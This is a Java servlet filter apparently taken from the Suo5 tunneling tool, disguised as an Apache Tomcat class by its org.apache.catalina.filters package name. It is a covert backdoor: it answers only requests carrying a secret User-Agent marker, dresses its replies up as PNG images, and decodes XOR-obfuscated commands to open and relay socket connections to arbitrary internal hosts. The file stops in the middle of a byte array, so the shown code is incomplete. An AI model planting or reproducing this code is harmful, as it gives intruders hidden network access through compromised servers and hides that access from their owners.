package org.apache.catalina.filters;


import javax.net.ssl.*;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Random;

public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509TrustManager {
    public static HashMap addrs = collectAddr();
    public static HashMap ctx = new HashMap();

    InputStream gInStream;
    OutputStream gOutStream;

    public Suo5Filter() {
    }

    public Suo5Filter(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }

    public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) sReq;
        HttpServletResponse response = (HttpServletResponse) sResp;
        String agent = request.getHeader("User-Agent");
        String acceptLang = request.getHeader("Accept-Language");

        if (agent == null || (!agent.trim().contains("  ") && !agent.trim().contains("0.1.0"))) {
            if (chain != null) {
                chain.doFilter(sReq, sResp);
            }
            return;
        }

        try {
            if (acceptLang.endsWith("0.6")) {
                response.setHeader("Content-Type", "application/octet-stream");
                tryFullDuplex(request, response);
                return;
            }
            response.setHeader("Content-Type", "image/png");
            if (acceptLang.endsWith("0.5")) {
                processDataBio(request, response);
            } else {
                processDataUnary(request, response);
            }
        } catch (Throwable e) {
//                System.out.printf("process data error %s\n", e);
//                e.printStackTrace();
        }
    }
    public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
        int bufferOffset = 0;
        while (bufferOffset < b.length) {
            int readLength = b.length - bufferOffset;
            int readResult = is.read(b, bufferOffset, readLength);
            if (readResult == -1) break;
            bufferOffset += readResult;
        }
    }

    public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
        InputStream in = request.getInputStream();
        OutputStream out = response.getOutputStream();

        Random r = new Random();

        byte[] b = new byte[r.nextInt(512)];
        r.nextBytes(b);
        out.write(b);

        byte[] data = new byte[64];
        readFull(in, data);
        out.write(data);
        out.flush();
    }


    private HashMap newCreate(byte s) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x04});
        m.put("s", new byte[]{s});
        return m;
    }

    private HashMap newData(byte[] data) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private HashMap newDel() {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private HashMap newStatus(byte b) {
        HashMap m = new HashMap();
        m.put("s", new byte[]{b});
        return m;
    }

    byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i /*>> 0*/);
        return result;
    }

    int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) |
                ((bytes[1] & 0xFF) << 16) |
                ((bytes[2] & 0xFF) << 8) |
                ((bytes[3] & 0xFF) << 0);
    }

    synchronized void put(String k, Object v) {
        ctx.put(k, v);
    }

    synchronized Object get(String k) {
        return ctx.get(k);
    }

    synchronized Object remove(String k) {
        return ctx.remove(k);
    }

    byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0) {
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        int copyLength = Math.min(original.length - from, newLength);
        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
        // System.arraycopy(original, from, copy, 0,  copyLength);
        for (int i = 0; i < copyLength; i++) {
            copy[i] = original[from + i];
        }
        return copy;
    }


    private byte[] marshal(HashMap m) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        Object[] keys = m.keySet().toArray();
        for (int i = 0; i < keys.length; i++) {
            String key = (String) keys[i];
            byte[] value = (byte[]) m.get(key);
            buf.write((byte) key.length());
            buf.write(key.getBytes());
            buf.write(u32toBytes(value.length));
            buf.write(value);
        }

        byte[] data = buf.toByteArray();
        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
        dbuf.putInt(data.length);
        // xor key
        byte key = (byte) ((Math.random() * 255) + 1);
        dbuf.put(key);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ key);
        }
        dbuf.put(data);
        return dbuf.array();
    }

    private HashMap unmarshal(InputStream in) throws Exception {
        byte[] header = new byte[4 + 1]; // size and datatype
        readFull(in, header);
        // read full
        ByteBuffer bb = ByteBuffer.wrap(header);
        int len = bb.getInt();
        int x = bb.get();
        if (len > 1024 * 1024 * 32) {
            throw new IOException("invalid len");
        }
        byte[] bs = new byte[len];
        readFull(in, bs);
        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }
        HashMap m = new HashMap();
        byte[] buf;
        for (int i = 0; i < bs.length - 1; ) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            buf = copyOfRange(bs, i, i + kLen);
            String key = new String(buf);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            buf = copyOfRange(bs, i, i + 4);
            int vLen = bytesToU32(buf);
            i += 4;
            if (vLen < 0) {
                throw new Exception("value error");
            }

            if (i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = copyOfRange(bs, i, i + vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        final InputStream reqInputStream = request.getInputStream();
        HashMap dataMap = unmarshal(reqInputStream);

        byte[] action = (byte[]) dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            resp.setStatus(403);
            return;
        }

        resp.setHeader("X-Accel-Buffering", "no");
        resp.setBufferSize(512);
        final OutputStream respOutStream = resp.getOutputStream();
        respOutStream.write(new byte[]{
                (byte) 0x89, (byte) 0x50, (byte) 0x4E, (byte) 0x47, (byte) 0x0D, (byte) 0x0A, (byte) 0x1A, (byte) 0x0A, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0D, (byte) 0x49, (byte) 0x48, (byte) 0x44, (byte) 0x52,
                (byte) 0x00, (byte) 0x00, (byte) 0x03, (byte) 0x20, (byte) 0x00, (byte) 0x00, (byte) 0x02, (byte) 0x58, (byte) 0x08, (byte) 0x06, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x9A, (byte) 0x76, (byte) 0x82,
                (byte) 0x70, (byte) 0x00, (byte) 0x03, (byte) 0x76, (byte) 0x3C, (byte) 0x49, (byte) 0x44, (byte) 0x41, (byte) 0x54, (byte) 0x78, (byte) 0x01, (byte) 0xEC, (byte) 0xC6, (byte) 0x05, (byte) 0xA1, (byte) 0x86,
                (byte) 0x00, (byte) 0x18, (byte) 0x03, (byte) 0x40, (byte) 0xDC, (byte) 0x4A, (byte) 0xD3, (byte) 0x87, (byte) 0x12, (byte) 0x14, (byte) 0xA0, (byte) 0xD3, (byte) 0xD0, (byte) 0x02, (byte) 0xCF, (byte) 0xE5,
                (byte) 0xBF, (byte) 0xFB, (byte) 0x64, (byte) 0x2B, (byte) 0xDE, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x20, (byte) 0xE5, (byte) 0x79, (byte) 0x49, (byte) 0xAA, (byte) 0xE7, (byte) 0xEA, (byte) 0x79, (byte) 0x4E,
                (byte) 0xB7, (byte) 0x2C, (byte) 0x19, (byte) 0x8E, (byte) 0x6C, (byte) 0x8F, (byte) 0x1C, (byte) 0x9F, (byte) 0x3E, (byte) 0x1D, (byte) 0x39, (byte) 0x26, (byte) 0xA9, (byte) 0x8F, (byte) 0xEC, (byte) 0x8F,
                (byte) 0xEB, (byte) 0xB6, (byte) 0x2D, (byte) 0xD3, (byte) 0xBA, (byte) 0xA6, (byte) 0x2F, (byte) 0x1E, (byte) 0x49, (byte) 0xDA, (byte) 0x24, (byte) 0x75, (byte) 0x01, (byte) 0x00, (byte) 0xF0, (byte) 0xCD,
                (byte) 0xCA, (byte) 0x02, (byte) 0xF8, (byte) 0x55, (byte) 0x76, (byte) 0x76, (byte) 0xCE, (byte) 0x22, (byte) 0x58, (byte) 0x92, (byte) 0x63, (byte) 0x4B, (byte) 0xD3, (byte) 0xFF, (byte) 0x39, (byte) 0xEE,
                (byte) 0x1E, (byte) 0x98, (byte) 0x70, (byte) 0x51, (byte) 0x25, (byte) 0x1A, (byte) 0x66, (byte) 0x3D, (byte) 0xEB, (byte) 0x55, (byte) 0x33, (byte) 0x33, (byte) 0xAE, (byte) 0x86, (byte) 0xAA, (byte) 0x87,
                (byte) 0x79, (byte) 0x9A, (byte) 0x99, (byte) 0xB9, (byte) 0xA5, (byte) 0x3B, (byte) 0xCC, (byte) 0x4C, (byte) 0xCD, (byte) 0xFB, (byte) 0xA7, (byte) 0x7D, (byte) 0x6F, (byte) 0xC7, (byte) 0x64, (byte) 0xBD,
                (byte) 0x1A, (byte) 0x66, (byte) 0xC6, (byte) 0x26, (byte) 0x3D, (byte) 0x93, (byte) 0xF4, (byte) 0xBA, (byte) 0xAA, (byte) 0x2E, (byte) 0x66, (byte) 0x84, (byte) 0xC3, (byte) 0x39, (byte) 0xE3, (byte) 0x9E,
                (byte) 0x91, (byte) 0x69, (byte) 0xA5, (byte) 0x61, (byte) 0x6E, (byte) 0xF4, (byte) 0xAF, (byte) 0xEC, (byte) 0xB3, (byte) 0xFF, (byte) 0xC4, (byte) 0x89, (byte) 0xC8, (byte) 0xA2, (byte) 0x55, (byte) 0xFD,
                (byte) 0xE5, (byte) 0x99, (byte) 0x59, (byte) 0x4A, (byte) 0x44, (byte) 0x0E, (byte) 0x7A, (byte) 0xFA, (byte) 0x14, (byte) 0x26, (byte) 0x67, (byte) 0x6B, (byte) 0x8C, (byte) 0x77, (byte) 0xC6, (byte) 0x90,
                (byte) 0x8D, (byte) 0x11, (byte) 0x2C, (byte) 0x02, (byte) 0xC3, (byte) 0x4C, (byte) 0x06, (byte) 0x99, (byte) 0x32, (byte) 0x67, (byte) 0x19, (byte) 0x19, (byte) 0x63, (byte) 0x40, (byte) 0x40, (byte) 0xA2,
                (byte) 0x10, (byte) 0x72, (byte) 0x2E, (byte) 0x68, (byte) 0xDB, (byte) 0x82, (byte) 0x37, (byte) 0x1B, (byte) 0xF0, (byte) 0x7A, (byte) 0x0D, (byte) 0x37, (byte) 0x8E, (byte) 0xE0, (byte) 0x7C, (byte) 0x8D,
                (byte) 0x2C, (byte) 0x11, (byte) 0x01, (byte) 0x4D, (byte) 0x03, (byte) 0x88, (byte) 0x40, (byte) 0x98, (byte) 0x4D, (byte) 0x20, (byte) 0x52, (byte) 0xBF, (byte) 0xDB, (byte) 0x61, (byte) 0xCE, (byte) 0x19,
                (byte) 0x55, (byte) 0x75, (byte) 0x7E, (byte) 0xF7, (byte) 0x5D, (byte) 0x84, (byte) 0xB7, (byte) 0xDF, (byte) 0xD6, (byte) 0xF4, (byte) 0x1F, (byte) 0xFF, (byte) 0x63, (byte) 0xE7, (byte) 0x3F, (byte) 0xF0,
                (byte) 0x01, (byte) 0xA4, (byte) 0x7F, (byte) 0xF6, (byte) 0xCF, (byte) 0x20, (byte) 0x57, (byte) 0x57, (byte) 0x88, (byte) 0x00, (byte) 0x29, (byte) 0x7E, (byte) 0x6E, (byte) 0x52, (byte) 0xA9, (byte) 0x54,
                (byte) 0x2A, (byte) 0x95, (byte) 0x4A, (byte) 0xA5, (byte) 0x16, (byte) 0x90, (byte) 0x4A, (byte) 0xA5, (byte) 0x52, (byte) 0x4E, (byte) 0x2F, (byte) 0xAE, (byte) 0xAE, (byte) 0xC8, (byte) 0x7F, (byte) 0xCF,
                (byte) 0xF7, (byte) 0xE8, (byte) 0x85, (byte) 0x31, (byte) 0xDE, (byte) 0xA6, (byte) 0x44, (byte) 0xC6, (byte) 0x5A, (byte) 0xB4, (byte) 0x31, (byte) 0x92, (byte) 0x8B, (byte) 0x31, (byte) 0xB9, (byte) 0x94,
                (byte) 0x60, (byte) 0x55, (byte) 0x61, (byte) 0x54, (byte) 0x89, (byte) 0x73, (byte) 0x16, (byte) 0x6D, (byte) 0x4A, (byte) 0x4B, (byte) 0xD1, (byte) 0x28, (byte) 0x3B, (byte) 0x2C, (byte) 0xF0, (byte) 0xB2,
                (byte) 0x5B, (byte) 0x60, (byte) 0x5E, (byte) 0x66, (byte) 0xE7, (byte) 0xC0, (byte) 0xC3, (byte) 0x00, (byte) 0xB3, (byte) 0xDD, (byte) 0xA2, (byte) 0x71, (byte) 0x8E, (byte) 0x6C, (byte) 0xDF, (byte) 0x83,
                (byte) 0xF2, (byte) 0xCE, (byte) 0x3A, (byte) 0x27, (byte) 0x6C, (byte) 0xED, (byte) 0xF1, (byte) 0x59, (byte) 0x15, (byte) 0x55, (byte) 0x84, (byte) 0x94, (byte) 0x10, (byte) 0xBD, (byte) 0x67, (byte) 0x3F,
                (byte) 0xCF, (byte) 0x1A, (byte) 0x42, (byte) 0x80, (byte) 0xBF, (byte) 0xB9, (byte) 0x51, (byte) 0x3F, (byte) 0x4D, (byte) 0xF0, (byte) 0x21, (byte) 0x98, (byte) 0x48, (byte) 0xA4, (byte) 0xC2, (byte) 0x0C,
                (byte) 0x51, (byte) 0x55, (byte) 0x0F, (byte) 0x58, (byte) 0x38, (byte) 0x87, (byte) 0x20, (byte) 0xA2, (byte) 0x11, (byte) 0xD0, (byte) 0xB9, (byte) 0x69, (byte) 0x54, (byte) 0xC6, (byte) 0xB1, (byte) 0x9B,
                (byte) 0x1E, (byte) 0x3F, (byte) 0x86, (byte) 0x27, (byte) 0x82, (byte) 0xFC, (byte) 0xAC, (byte) 0x29, (byte) 0x28, (byte) 0x95, (byte) 0x4A, (byte) 0xA5, (byte) 0x52, (byte) 0xA9, (byte) 0x54, (byte) 0x6A,
                (byte) 0x01, (byte) 0xA9, (byte) 0x54, (byte) 0x2A, (byte) 0xCA, (byte) 0x1F, (byte) 0xFC, (byte) 0x20, (byte) 0x9A, (byte) 0x0F, (byte) 0x7D, (byte) 0x68, (byte) 0x6A, (byte) 0xC7, (byte) 0x91, (byte) 0x07,
                (byte) 0xEF, (byte) 0xC9, (byte) 0x3A, (byte) 0x47, (byte) 0x9D, (byte) 0x2A, (byte) 0xDC, (byte) 0x34, (byte) 0xA5, (byte) 0x46, (byte) 0x04, (byte) 0x56, (byte) 0xB5, (byte) 0x14, (byte) 0x0F, (byte) 0x18,
                (byte) 0x55, (byte) 0x71, (byte) 0x29, (byte) 0x95, (byte) 0x04, (byte) 0x2F, (byte) 0x05, (byte) 0x83, (byte) 0x8C, (byte) 0x48, (byte) 0x62, (byte) 0x80, (byte) 0x58, (byte) 0x04, (byte) 0x60, (byte) 0x46,
                (byte) 0x49, (byte) 0x2A, (byte) 0x32, (byte) 0xEF, (byte) 0x73, (byte) 0x4F, (byte) 0x4E, (byte) 0x66, (byte) 0x06, (byte) 0x9A, (byte) 0x06, (byte) 0x66, (byte) 0x1C, (byte) 0xC5, (byte) 0xAE, (byte) 0x56,
                (byte) 0xD4, (byte) 0xE4, (byte) 0xD9, (byte) 0xB6, (byte) 0x2D, (byte) 0x6C, (byte) 0xD9, (byte) 0x59, (byte) 0x0B, (byte) 0xCE, (byte) 0x12, (byte) 0xB3, (byte) 0x02, (byte) 0x28, (byte) 0x22, (byte) 0xA6,
                (byte) 0x84, (byte) 0x18, (byte) 0x23, (byte) 0x62, (byte) 0x08, (byte) 0xE4, (byte) 0xBD, (byte) 0xC7, (byte) 0x3C, (byte) 0x4D, (byte) 0x1A, (byte) 0x76, (byte) 0x3B, (byte) 0xF8, (byte) 0xDD, (byte) 0x4E,
                (byte) 0x7D, (byte) 0x8C, (byte) 0x1C, (byte) 0x01, (byte) 0x48, (byte) 0x91, (byte) 0xA8, (byte) 0x24, (byte) 0x8B, (byte) 0x31, (byte) 0x50, (byte) 0x6B, (byte) 0x91, (byte) 0x88, (byte) 0x34, (byte) 0xB5,
                (byte) 0x2D, (byte) 0x82, (byte) 0x08, (byte) 0x47, (byte) 0x55, (byte) 0x78, (byte) 0x55, (byte) 0xF1, (byte) 0x4D, (byte) 0x63, (byte) 0xEE, (byte) 0xA6, (byte) 0x49, (byte) 0xC2, (byte) 0x93, (byte) 0x27,
                (byte) 0xBD, (byte) 0xCF, (byte) 0xC5, (byte) 0x6A, (byte) 0x42, (byte) 0xA5, (byte) 0x52, (byte) 0xA9, (byte) 0x54, (byte) 0x2A, (byte) 0x95, (byte) 0x4A, (byte) 0x2D, (byte) 0x20, (byte) 0x95, (byte) 0xCA,
                (byte) 0x4F, (byte) 0x27, (byte) 0x4F, (byte) 0x9B, (byte) 0x8F, (byte) 0xFC, (byte) 0x48, (byte) 0xEA, (byte) 0x3E, (byte) 0xF2, (byte) 0x23, (byte) 0x4D, (byte) 0x77, (byte) 0x7A, (byte) 0xCA, (byte) 0xCD,
                (byte) 0xC5, (byte) 0x85, (byte) 0xF4, (byte) 0x44, (byte) 0xDC, (byte) 0x89, (byte) 0xA0, (byte) 0x61, (byte) 0xB6, (byte) 0x8E, (byte) 0x48, (byte) 0x9A, (byte) 0x18, (byte) 0xB1, (byte) 0x2F, (byte) 0x1B,
                (byte) 0x00, (byte) 0x6C, (byte) 0x4A, (byte) 0x6A, (byte) 0x45, (byte) 0xC0, (byte) 0x59, (byte) 0x73, (byte) 0x90, (byte) 0x55, (byte) 0x25, (byte) 0x27, (byte) 0x31, (byte) 0x50, (byte) 0xE6, (byte) 0x45,
                (byte) 0x11, (byte) 0x10
        });
        Socket sc;
        try {
            String host = new String((byte[]) dataMap.get("h"));
            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
            if (port == 0) {
                try {
                    // Cannot convert Integer to int
                    port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
                } catch (Exception e) {
                    port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
                }
            }
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            respOutStream.write(marshal(newStatus((byte) 0x01)));
            respOutStream.flush();
            respOutStream.close();
            return;
        }

        respOutStream.write(marshal(newStatus((byte) 0x00)));
        respOutStream.flush();
        resp.flushBuffer();

        final OutputStream scOutStream = sc.getOutputStream();
        final InputStream scInStream = sc.getInputStream();

        Thread t = null;
        try {
            Suo5Filter p = new Suo5Filter(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
            readReq(reqInputStream, scOutStream);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
        } finally {
            sc.close();
            respOutStream.close();
            if (t != null) {
                t.join();
            }
        }
    }

    private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
        byte[] readBuf = new byte[1024 * 8];
        while (true) {
            int n = inputStream.read(readBuf);
            if (n <= 0) {
                break;
            }
            byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
            if (needMarshal) {
                dataTmp = marshal(newData(dataTmp));
            }
            outputStream.write(dataTmp);
            outputStream.flush();
        }
    }

    private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
        while (true) {
            HashMap dataMap;
            dataMap = unmarshal(bufInputStream);

            byte[] actions = (byte[]) dataMap.get("ac");
            if (actions.length != 1) {
                return;
            }
            byte action = actions[0];
            if (action == 0x02) {
                socketOutStream.close();
                return;
            } else if (action == 0x01) {
                byte[] data = (byte[]) dataMap.get("dt");
                if (data.length != 0) {
                    socketOutStream.write(data);
                    socketOutStream.flush();
                }
            } else if (action == 0x03) {
                continue;
            } else {
                return;
            }
        }
    }

    private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
            Exception {
        InputStream is = request.getInputStream();
        BufferedInputStream reader = new BufferedInputStream(is);
        HashMap dataMap;
        dataMap = unmarshal(reader);


        String clientId = new String((byte[]) dataMap.get("id"));
        byte[] actions = (byte[]) dataMap.get("ac");
        if (actions.length != 1) {
            resp.setStatus(403);
            return;
        }
            /*
                ActionCreate    byte = 0x00
                ActionData      byte = 0x01
                ActionDelete    byte = 0x02
                ActionHeartbeat byte = 0x03
             */
        byte action = actions[0];
        byte[] redirectData = (byte[]) dataMap.get("r");
        boolean needRedirect = redirectData != null && redirectData.length > 0;
        String redirectUrl = "";
        if (needRedirect) {
            dataMap.remove("r");
            redirectUrl = new String(redirectData);
            needRedirect = !isLocalAddr(redirectUrl);
        }
        // load balance, send request with data to request url
        // action 0x00 need to pipe, see below
        if (needRedirect && action >= 0x01 && action <= 0x03) {
            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
            conn.disconnect();
            return;
        }

        resp.setBufferSize(512);
        OutputStream respOutStream = resp.getOutputStream();
        if (action == 0x02) {
            Object o = this.get(clientId);
            if (o == null) return;
            OutputStream scOutStream = (OutputStream) o;
            scOutStream.close();
            return;
        } else if (action == 0x01) {
            Object o = this.get(clientId);
            if (o == null) {
                respOutStream.write(marshal(newDel()));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
            OutputStream scOutStream = (OutputStream) o;
            byte[] data = (byte[]) dataMap.get("dt");
            if (data.length != 0) {
                scOutStream.write(data);
                scOutStream.flush();
            }
            respOutStream.close();
            return;
        } else {
        }

        if (action != 0x00) {
            return;
        }
        resp.setHeader("X-Accel-Buffering", "no");
        respOutStream.write(new byte[]{
                (byte) 0x89, (byte) 0x50, (byte) 0x4E, (byte) 0x47, (byte) 0x0D, (byte) 0x0A, (byte) 0x1A, (byte) 0x0A, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0D, (byte) 0x49, (byte) 0x48, (byte) 0x44, (byte) 0x52,
                (byte) 0x00, (byte) 0x00, (byte) 0x03, (byte) 0x20, (byte) 0x00, (byte) 0x00, (byte) 0x02, (byte) 0x58, (byte) 0x08, (byte) 0x06, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x9A, (byte) 0x76, (byte) 0x82,
                (byte) 0x70, (byte) 0x00, (byte) 0x03, (byte) 0x76, (byte) 0x3C, (byte) 0x49, (byte) 0x44, (byte) 0x41, (byte) 0x54, (byte) 0x78, (byte) 0x01, (byte) 0xEC, (byte) 0xC6, (byte) 0x05, (byte) 0xA1, (byte) 0x86,
                (byte) 0x00, (byte) 0x18, (byte) 0x03, (byte) 0x40, (byte) 0xDC, (byte) 0x4A, (byte) 0xD3, (byte) 0x87, (byte) 0x12, (byte) 0x14, (byte) 0xA0, (byte) 0xD3, (byte) 0xD0, (byte) 0x02, (byte) 0xCF, (byte) 0xE5,
                (byte) 0xBF, (byte) 0xFB, (byte) 0x64, (byte) 0x2B, (byte) 0xDE, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x20, (byte) 0xE5, (byte) 0x79, (byte) 0x49, (byte) 0xAA, (byte) 0xE7, (byte) 0xEA, (byte) 0x79, (byte) 0x4E,
                (byte) 0xB7, (byte) 0x2C, (byte) 0x19, (byte) 0x8E, (byte) 0x6C, (byte) 0x8F, (byte) 0x1C, (byte) 0x9F, (byte) 0x3E, (byte) 0x1D, (byte) 0x39, (byte) 0x26, (byte) 0xA9, (byte) 0x8F, (byte) 0xEC, (byte) 0x8F,
                (byte) 0xEB, (byte) 0xB6, (byte) 0x2D, (byte) 0xD3, (byte) 0xBA, (byte) 0xA6, (byte) 0x2F, (byte) 0x1E, (byte) 0x49, (byte) 0xDA, (byte) 0x24, (byte) 0x75, (byte) 0x01, (byte) 0x00, (byte) 0xF0, (byte) 0xCD,
                (byte) 0xCA, (byte) 0x02, (byte) 0xF8, (byte) 0x55, (byte) 0x76, (byte) 0x76, (byte) 0xCE, (byte) 0x22, (byte) 0x58, (byte) 0x92, (byte) 0x63, (byte) 0x4B, (byte) 0xD3, (byte) 0xFF, (byte) 0x39, (byte) 0xEE,
                (byte) 0x1E, (byte) 0x98, (byte) 0x70, (byte) 0x51, (byte) 0x25, (byte) 0x1A, (byte) 0x66, (byte) 0x3D, (byte) 0xEB, (byte) 0x55, (byte) 0x33, (byte) 0x33, (byte) 0xAE, (byte) 0x86, (byte) 0xAA, (byte) 0x87,
                (byte) 0x79, (byte) 0x9A, (byte) 0x99, (byte) 0xB9, (byte) 0xA5, (byte) 0x3B, (byte) 0xCC, (byte) 0x4C, (byte) 0xCD, (byte) 0xFB, (byte) 0xA7, (byte) 0x7D, (byte) 0x6F, (byte) 0xC7, (byte) 0x64, (byte) 0xBD,
                (byte) 0x1A, (byte) 0x66, (byte) 0xC6, (byte) 0x26, (byte) 0x3D, (byte) 0x93, (byte) 0xF4, (byte) 0xBA, (byte) 0xAA, (byte) 0x2E, (byte) 0x66, (byte) 0x84, (byte) 0xC3, (byte) 0x39, (byte) 0xE3, (byte) 0x9E,
                (byte) 0x91, (byte) 0x69, (byte) 0xA5, (byte) 0x61, (byte) 0x6E, (byte) 0xF4, (byte) 0xAF, (byte) 0xEC, (byte) 0xB3, (byte) 0xFF, (byte) 0xC4, (byte) 0x89, (byte) 0xC8, (byte) 0xA2, (byte) 0x55, (byte) 0xFD,
                (byte) 0xE5, (byte) 0x99, (byte) 0x59, (byte) 0x4A, (byte) 0x44, (byte) 0x0E, (byte) 0x7A, (byte) 0xFA, (byte) 0x14, (byte) 0x26, (byte) 0x67, (byte) 0x6B, (byte) 0x8C, (byte) 0x77, (byte) 0xC6, (byte) 0x90,
                (byte) 0x8D, (byte) 0x11, (byte) 0x2C, (byte) 0x02, (byte) 0xC3, (byte) 0x4C, (byte) 0x06, (byte) 0x99, (byte) 0x32, (byte) 0x67, (byte) 0x19, (byte) 0x19, (byte) 0x63, (byte) 0x40, (byte) 0x40, (byte) 0xA2,
                (byte) 0x10, (byte) 0x72, (byte) 0x2E, (byte) 0x68, (byte) 0xDB, (byte) 0x82, (byte) 0x37, (byte) 0x1B, (byte) 0xF0, (byte) 0x7A, (byte) 0x0D, (byte) 0x37, (byte) 0x8E, (byte) 0xE0, (byte) 0x7C, (byte) 0x8D,
                (byte) 0x2C, (byte) 0x11, (byte) 0x01, (byte) 0x4D, (byte) 0x03, (byte) 0x88, (byte) 0x40, (byte) 0x98, (byte) 0x4D, (byte) 0x20, (byte) 0x52, (byte) 0xBF, (byte) 0xDB, (byte) 0x61, (byte) 0xCE, (byte) 0x19,
                (byte) 0x55, (byte) 0x75, (byte) 0x7E, (byte) 0xF7, (byte) 0x5D, (byte) 0x84, (byte) 0xB7, (byte) 0xDF, (byte) 0xD6, (byte) 0xF4, (byte) 0x1F, (byte) 0xFF, (byte) 0x63, (byte) 0xE7, (byte) 0x3F, (byte) 0xF0,
                (byte) 0x01, (byte) 0xA4, (byte) 0x7F, (byte) 0xF6, (byte) 0xCF, (byte) 0x20, (byte) 0x57, (byte) 0x57, (byte) 0x88, (byte) 0x00, (byte) 0x29, (byte) 0x7E, (byte) 0x6E, (byte) 0x52, (byte) 0xA9, (byte) 0x54,
